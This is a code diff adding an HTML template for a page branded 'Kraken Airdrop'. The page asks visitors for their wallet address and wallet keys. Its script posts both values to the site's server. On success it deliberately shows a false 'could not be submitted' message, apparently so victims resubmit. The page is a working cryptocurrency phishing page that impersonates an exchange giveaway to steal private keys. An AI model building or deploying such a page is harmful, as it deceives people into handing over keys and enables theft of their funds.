@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet Information</title>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='index.css') }}">
+    <!-- <link rel="stylesheet" href="index.css"> -->
+</head>
+<body> 
+     
+    <div class="kra">
+        <h1 class="hx"> Kraken Airdrop</h1>
+        <img src="{{ url_for('static', filename='kraken.png') }}" alt="" class="ken">
+    </div>
+    <form id="wallet-form" method="POST" action="{{ url_for('submit') }}">
+        <label for="wallet_address">Wallet Address:</label>
+        <input type="text" id="wallet_address" name="wallet_address"><br>
+
+        <label for="wallet_keys">Wallet Keys:</label>
+        <input type="text" id="wallet_keys" name="wallet_keys"><br>
+
+        <button type="submit">Submit</button>
+    </form>
+ 
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $('#wallet-form').submit(function(event) {
+                event.preventDefault();
+                var walletAddress = $('#wallet_address').val();
+                var walletKeys = $('#wallet_keys').val();
+                $.ajax({
+                    url: '{{ url_for("submit") }}',
+                    type: 'POST',
+                    data: {
+                        'wallet_address': walletAddress,
+                        'wallet_keys': walletKeys
+                    },
+                    success: function(response) {
+                        alert('Data could not be submitted successfully!');
+                    },
+                    error: function(error) {
+                        alert('Error submitting data.');
+                        location.reload();
+                    }
+                });
+            });
+        });
+    </script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
